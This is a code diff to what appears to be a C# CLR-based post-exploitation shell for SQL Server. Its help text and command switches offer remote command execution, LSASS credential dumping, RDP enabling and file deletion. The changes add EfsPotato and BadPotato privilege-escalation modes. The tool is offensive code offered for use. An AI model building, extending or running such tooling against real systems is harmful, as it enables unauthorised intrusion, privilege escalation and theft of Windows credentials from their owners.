@@ -39,7 +39,8 @@ clr_ping {host}            - ping by clr
 clr_cat {file}             - view file contents by clr
 clr_rm {file}              - delete file by clr
 clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
-clr_potato {cmd}           - exec by EfsPotato like clr_exec
+clr_efspotato {cmd}        - exec by EfsPotato like clr_exec
+clr_badpotato {cmd}        - exec by BadPotato like clr_exec
 clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files           
 clr_dumplsass {path}       - dumplsass by clr
 clr_rdp                    - check RDP port and Enable RDP
@@ -448,7 +449,14 @@ exit                       - terminates the server process (and this session)"
                                 clr_exec(s);
                                 break;
                             }
-                        case "clr_potato":
+                        case "clr_efspotato":
+                            {
+                                String s = String.Empty;
+                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
+                                clr_exec(s);
+                                break;
+                            }
+                        case "clr_badpotato":
                             {
                                 String s = String.Empty;
                                 for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
@@ -681,7 +689,14 @@ exit                       - terminates the server process (and this session)"
                             clr_exec(s);
                             break;
                         }
-                    case "clr_potato":
+                    case "clr_efspotato":
+                        {
+                            String s = String.Empty;
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
+                            clr_exec(s);
+                            break;
+                        }
+                    case "clr_badpotato":
                         {
                             String s = String.Empty;
                             for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
